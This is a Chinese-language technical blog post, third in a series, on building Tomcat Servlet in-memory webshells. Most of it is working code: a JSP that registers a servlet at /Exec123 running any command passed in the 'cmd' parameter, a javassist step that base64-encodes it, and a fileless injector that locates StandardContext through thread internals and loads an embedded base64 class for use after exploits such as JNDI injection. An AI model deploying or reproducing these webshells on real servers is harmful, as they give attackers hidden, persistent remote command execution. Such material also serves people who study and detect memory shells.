---
layout: post
date: 2025-12-8
title: "Tomcat内存马系列3-Servlet-内存马
author: "XinYiSleep"
category: Java
---

<h1 id="YBB1q">一.基础信息</h1>

```
内存马Servlet还是隔了很长时间了，问题不大知识点也不多也不难，在前两章中我们知道了其实
tomcat的内存马就是查看tomcat是怎么设置我们的Listener、Filter、Servlet的，只需要知道他是
怎么设置的模仿他就实现了动态注册，Servlet也是一样的，下面我们分别用到了下面的两个包分别
是tomcat和javassist。

```

```java
        <dependency>
            <groupId>org.apache.tomcat</groupId>
            <artifactId>tomcat-catalina</artifactId>
            <version>8.5.54</version>
        </dependency>
        <dependency>
            <groupId>org.javassist</groupId>
            <artifactId>javassist</artifactId>
            <version>3.30.2-GA</version>
        </dependency>
```



<h1 id="tMnbr">二.动态注册</h1>
```
看看Servlet是怎么呗注册的,ContextConfig#configureContext(图一)，可以看到webxml里面其中
我们需要通过动态注册修改的属性，那么看看在哪里进行了注册(图二)，这里的context属性就是StandardContext
，其实就结束了，那么模仿他修改一下就行了不一样的就是我们获取StandardContext是有区别的其中tomcat8.0
一下的和通用的是有区别的，这里我就直接用用通用的了。

```
![](https://xinyisleep.github.io/img/2025/Webshell/Servlet/1.png)

![](https://xinyisleep.github.io/img/2025/Webshell/Servlet/2.png)



<h1 id="G9kbW">三.完整的Servlet内存马</h1>
```
不懂的我都有注释不难理解，其实你就当是固定的试着理解这些固定的设置干了什么就可以了代码一。
```

```java
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="org.apache.catalina.Wrapper" %>
<%@ page import="java.io.IOException" %>
<%@ page import="java.io.BufferedReader" %>
<%@ page import="java.io.InputStreamReader" %><%--
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<html>
<head>
    <title>Title</title>
</head>
<body>

<%!
    public class Web extends HttpServlet {

        @Override
        protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
            String name = req.getParameter("cmd");
            if(name!=null){
                Process exec = Runtime.getRuntime().exec(name);
                BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(exec.getInputStream()));
                String i;
                while ((i=bufferedReader.readLine())!=null){
                    resp.setCharacterEncoding("UTF-8");
                    resp.setContentType("text/HTML;UTF-8");
                    resp.getWriter().println(i);
                }
            }

        }
    }

%>
<%
    //获取org.apache.coyote.Request实例
    //request实际上是org.apache.catalina.connector.RequestFacade他实现了HttpServletRequest
    Field request1 = request.getClass().getDeclaredField("request");
    request1.setAccessible(true);
    //上面获取了request属性取出org.apache.coyote.Request
    Request o = (Request)request1.get(request);
    //强制转换成StandardContext对象，执行addApplicationListener
    StandardContext context = (StandardContext)o.getContext();

    //拿到StandardWrapper的实例
    Wrapper wrapper = context.createWrapper();
    //设置名字随便
    wrapper.setName("Webshell");
    //设置类名
    wrapper.setServletClass(Web.class.getName());
    //设置类
    wrapper.setServlet(new Web());

    //把封装到wrapper设置到StandardContext里面
    context.addChild(wrapper);
    //设置访问路由映射url
    context.addServletMappingDecoded("/Exec123","Webshell");

%>
</body>
</html>

```




<h1 id="G9kbE">四.实战中的Servlet</h1>

```
为什么叫实战中的Servlet就是真实的无文件落地，如可以通过JNDI注入，第一步就是写一个恶意的Servlet代码一，
接着通过javassist获取类转换成base64字节(代码二),之后就是最终的文件获取StandardWrapper的实例，]
把base64转换回来再通过ClassLoader类defineClass方法转换成可执行类，然后封装到StandardWrapper
实现动态注册(代码三)。
```

```java

import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;


public class Web extends HttpServlet {

    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        String name = req.getParameter("cmd");
        if(name!=null){
            Process exec = Runtime.getRuntime().exec(name);
            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(exec.getInputStream()));
            String i;
            while ((i=bufferedReader.readLine())!=null){
                resp.setCharacterEncoding("UTF-8");
                resp.setContentType("Text/HTML; UTF-8");
                resp.getWriter().println(i);
            }

        }
    }
}

```

```java
import javassist.ClassPool;
import javassist.CtClass;
import javassist.NotFoundException;

import java.util.Base64;

public class Main {
    public static void main(String[] args) throws Exception {
        ClassPool aDefault = ClassPool.getDefault();
        CtClass web = aDefault.get("Web");
        byte[] bytecode = web.toBytecode();
        String s = Base64.getEncoder().encodeToString(bytecode);
        System.out.println(s);
    }
}

```

```java

import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Base64;
import java.util.HashMap;
import java.util.Iterator;

import org.apache.catalina.Wrapper;
import org.apache.catalina.core.StandardHost;
import org.apache.catalina.core.StandardContext;

import javax.servlet.ServletRequestListener;
import javax.servlet.http.HttpServlet;

public class Webshell {
        String uri;
        String serverName;
        StandardContext standardContext;
        public Object getField(Object object, String fieldName) {
            Field declaredField;
            Class clazz = object.getClass();
            while (clazz != Object.class) {
                try {

                    declaredField = clazz.getDeclaredField(fieldName);
                    declaredField.setAccessible(true);
                    return declaredField.get(object);
                } catch (NoSuchFieldException | IllegalAccessException e) {

                }
                clazz = clazz.getSuperclass();
            }
            return null;
        }

        public Webshell() {
            Thread[] threads = (Thread[]) this.getField(Thread.currentThread().getThreadGroup(), "threads");
            Object object;
            for (Thread thread : threads) {

                if (thread == null) {
                    continue;
                }
                if (thread.getName().contains("exec")) {
                    continue;
                }
                Object target = this.getField(thread, "target");
                if (!(target instanceof Runnable)) {
                    continue;
                }

                try {
                    object = getField(getField(getField(target, "this$0"), "handler"), "global");
                } catch (Exception e) {
                    continue;
                }
                if (object == null) {
                    continue;
                }
                java.util.ArrayList processors = (java.util.ArrayList) getField(object, "processors");
                Iterator iterator = processors.iterator();
                while (iterator.hasNext()) {
                    Object next = iterator.next();

                    Object req = getField(next, "req");
                    Object serverPort = getField(req, "serverPort");
                    if (serverPort.equals(-1)){continue;}

                    org.apache.tomcat.util.buf.MessageBytes serverNameMB = (org.apache.tomcat.util.buf.MessageBytes) getField(req, "serverNameMB");
                    this.serverName = (String) getField(serverNameMB, "strValue");
                    if (this.serverName == null){
                        this.serverName = serverNameMB.toString();
                    }
                    if (this.serverName == null){
                        this.serverName = serverNameMB.getString();
                    }

                    org.apache.tomcat.util.buf.MessageBytes uriMB = (org.apache.tomcat.util.buf.MessageBytes) getField(req, "decodedUriMB");
                    this.uri = (String) getField(uriMB, "strValue");
                    if (this.uri == null){
                        this.uri = uriMB.toString();
                    }
                    if (this.uri == null){
                        this.uri = uriMB.getString();
                    }

                    this.getStandardContext();
                    return;
                }
            }
        }

        public void getStandardContext() {
            Thread[] threads = (Thread[]) this.getField(Thread.currentThread().getThreadGroup(), "threads");
            Object object;
            for (Thread thread : threads) {
                if (thread == null) {
                    continue;
                }

                if (!thread.getName().contains("StandardEngine")) {
                    continue;
                }

                Object target = this.getField(thread, "target");
                if (target == null) { continue; }
                HashMap children;

                try {
                    children = (HashMap) getField(getField(target, "this$0"), "children");
                    StandardHost standardHost = (StandardHost) children.get(this.serverName);
                    children = (HashMap) getField(standardHost, "children");
                    Iterator iterator = children.keySet().iterator();
                    while (iterator.hasNext()){
                        String contextKey = (String) iterator.next();
                        if (!(this.uri.startsWith(contextKey))){continue;}
                        StandardContext standardContext = (StandardContext) children.get(contextKey);

                        //拿到StandardWrapper的实例
                        Wrapper wrapper = standardContext.createWrapper();
                        //设置名字随便
                        wrapper.setName("Webshell");
                        //设置类名
                        HttpServlet exec = exec();
                        wrapper.setServletClass(exec.getClass().getName());
                        //设置类
                        wrapper.setServlet(exec);

                        //把封装到wrapper设置到StandardContext里面
                        standardContext.addChild(wrapper);
                        //设置访问路由映射url
                        standardContext.addServletMappingDecoded("/Exec123","Webshell");


                        return;
                    }
                } catch (Exception e) {
                    continue;
                }
                if (children == null) {
                    continue;
                }
            }
        }
        public HttpServlet exec() throws Exception {

            String Code="yv66vgAAADQAYgoAEwAxCAAyCwAzADQKADUANgoANQA3BwA4BwA5CgA6ADsKAAcAPAoABgA9CgAGAD4IAD8LAEAAQQgAQgsAQABDCwBAAEQKAEUARgcARwcASAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAFTFdlYjsBAAVkb0dldAEAUihMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7KVYBAARleGVjAQATTGphdmEvbGFuZy9Qcm9jZXNzOwEADmJ1ZmZlcmVkUmVhZGVyAQAYTGphdmEvaW8vQnVmZmVyZWRSZWFkZXI7AQABaQEAEkxqYXZhL2xhbmcvU3RyaW5nOwEAA3JlcQEAJ0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0OwEABHJlc3ABAChMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7AQAEbmFtZQEADVN0YWNrTWFwVGFibGUHAEkHAEoHADgBAApFeGNlcHRpb25zBwBLBwBMAQAKU291cmNlRmlsZQEACFdlYi5qYXZhDAAUABUBAANjbWQHAE0MAE4ATwcAUAwAUQBSDAAdAFMBABZqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyAQAZamF2YS9pby9JbnB1dFN0cmVhbVJlYWRlcgcASgwAVABVDAAUAFYMABQAVwwAWABZAQAFVVRGLTgHAFoMAFsAXAEAEFRleHQvSFRNTDsgVVRGLTgMAF0AXAwAXgBfBwBgDABhAFwBAANXZWIBAB5qYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXQBABBqYXZhL2xhbmcvU3RyaW5nAQARamF2YS9sYW5nL1Byb2Nlc3MBAB5qYXZheC9zZXJ2bGV0L1NlcnZsZXRFeGNlcHRpb24BABNqYXZhL2lvL0lPRXhjZXB0aW9uAQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAEADGdldFBhcmFtZXRlcgEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEAEyhMamF2YS9pby9SZWFkZXI7KVYBAAhyZWFkTGluZQEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAmamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2UBABRzZXRDaGFyYWN0ZXJFbmNvZGluZwEAFShMamF2YS9sYW5nL1N0cmluZzspVgEADnNldENvbnRlbnRUeXBlAQAJZ2V0V3JpdGVyAQAXKClMamF2YS9pby9QcmludFdyaXRlcjsBABNqYXZhL2lvL1ByaW50V3JpdGVyAQAHcHJpbnRsbgAhABIAEwAAAAAAAgABABQAFQABABYAAAAvAAEAAQAAAAUqtwABsQAAAAIAFwAAAAYAAQAAAAwAGAAAAAwAAQAAAAUAGQAaAAAABAAbABwAAgAWAAAA8gAFAAcAAABVKxICuQADAgBOLcYASrgABC22AAU6BLsABlm7AAdZGQS2AAi3AAm3AAo6BRkFtgALWToGxgAhLBIMuQANAgAsEg65AA8CACy5ABABABkGtgARp//asQAAAAMAFwAAACYACQAAABAACQARAA0AEgAWABMAKwAVADYAFgA+ABcARgAYAFQAHAAYAAAASAAHABYAPgAdAB4ABAArACkAHwAgAAUAMwAhACEAIgAGAAAAVQAZABoAAAAAAFUAIwAkAAEAAABVACUAJgACAAkATAAnACIAAwAoAAAAEQAC/gArBwApBwAqBwAr+QAoACwAAAAGAAIALQAuAAEALwAAAAIAMA==";
            byte[] decode = Base64.getDecoder().decode(Code);
            ClassLoader contextClassLoader = Thread.currentThread().getContextClassLoader();
            Method declaredMethod1 = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            declaredMethod1.setAccessible(true);
            Class invoke = (Class)declaredMethod1.invoke(contextClassLoader,  decode, 0, decode.length);
            HttpServlet o = (HttpServlet) invoke.newInstance();
            return o;


        }
    }



```

